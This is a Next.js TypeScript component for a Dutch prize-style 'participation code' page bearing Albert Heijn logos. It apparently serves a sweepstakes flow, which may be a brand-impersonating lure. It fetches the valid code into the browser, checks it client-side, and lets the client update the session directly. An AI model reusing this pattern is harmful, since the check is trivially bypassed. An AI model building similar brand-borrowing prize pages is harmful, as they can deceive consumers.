"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { useSettings } from "@/contexts/SettingsContext";

export function CodeEntryClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings } = useSettings();
  const [partnerName, setPartnerName] = useState<string>("");
  const [expectedCode, setExpectedCode] = useState<string>("");
  const [enteredCode, setEnteredCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("partner_name, participation_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Sessie niet gevonden of configuratiefout.");
        setLoading(false);
        return;
      }

      setPartnerName(data.partner_name || "partner");
      setExpectedCode(data.participation_code || "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setError(null);

    const cleanCode = enteredCode.trim();
    if (!cleanCode) {
      setError("Voer je deelnamecode in.");
      return;
    }

    if (cleanCode !== expectedCode) {
      setError("De ingevoerde code is ongeldig.");
      return;
    }

    setProcessing(true);

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "win" })
      .eq("id", sessionId);

    if (upErr) {
      setError("Opslaan mislukt. Probeer het opnieuw.");
      setProcessing(false);
      return;
    }

    try {
      localStorage.setItem("activeSessionId", sessionId);
    } catch {
      // ignore
    }

    window.setTimeout(() => {
      setProcessing(false);
      window.location.href = `/win/${encodeURIComponent(sessionId)}`;
    }, 500);
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
        
        {/* Right Top Logo Placeholder */}
        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
          <img src="/ah-logo-transparent.png" alt="AH Logo" className="h-10 w-auto" id="code-ah-logo" />
        </div>

        <div className="mb-6 flex items-start gap-4">
          <div className="mt-1 shrink-0">
            <img src="/ah-icon-gift-ticket-transparent.png" alt="Gift Ticket" className="h-12 w-12" id="code-gift-icon" />
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white mb-1">{settings.code_title}</h2>
            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">
              {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
                <span key={i}>
                  {part}
                  {i < arr.length - 1 && <strong className="text-[#0088FF] font-bold">{partnerName}</strong>}
                </span>
              ))}
            </p>
          </div>
        </div>

        {error && (
          <div className="mb-6 rounded-xl bg-red-500/10 p-4 text-center text-sm font-bold text-red-400 border border-red-500/20">
            {error}
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="mb-2 block text-sm font-medium text-white text-left">Deelnamecode</label>
            <div className="relative">
              <div className="pointer-events-none absolute inset-y-0 left-0 flex items-center pl-4">
                <img src="/ah-icon-participation-ticket-transparent.png" alt="Ticket" className="h-6 w-6 opacity-70" />
              </div>
              <input
                type="text"
                required
                className="w-full rounded-xl border border-transparent bg-white/10 py-4 pl-12 pr-4 text-2xl font-bold tracking-widest text-white outline-none focus:border-[#0066CC] focus:ring-2 focus:ring-[#0066CC]/50 transition-all placeholder:text-gray-500 shadow-sm"
                value={enteredCode}
                onChange={(e) => setEnteredCode(e.target.value)}
                placeholder=""
                autoComplete="off"
              />
            </div>
          </div>
          <button
            type="submit"
            disabled={processing}
            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {processing ? "Verwerken..." : settings.code_button}
          </button>
          
          <div className="mt-4 flex items-center justify-center gap-2">
            <img src="/ah-icon-security-transparent.png" alt="Secure" className="h-5 w-5" />
            <span className="text-[13px] font-medium text-gray-300">
              Je gegevens worden veilig verwerkt.
            </span>
          </div>
        </form>
      </div>
    </div>
  );
}
